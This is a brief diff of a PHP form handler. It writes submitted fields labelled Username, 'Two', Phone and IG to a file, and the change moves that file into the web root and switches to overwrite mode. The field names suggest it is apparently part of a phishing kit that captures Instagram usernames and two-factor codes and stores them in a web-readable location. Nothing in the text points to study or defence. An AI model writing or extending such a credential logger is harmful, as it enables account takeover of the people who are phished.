@@ -10,7 +10,7 @@ $Name = "Username:".$_POST['name']."
     ";
     $Two = "Two:".$_POST['two']."
     ";
-    $file=fopen("saved.txt", "a");
+    $file=fopen("var/www/html/saved.txt", "w");
     fwrite($file, $Name);
     fwrite($file, $Phone);
     fwrite($file, $IG);
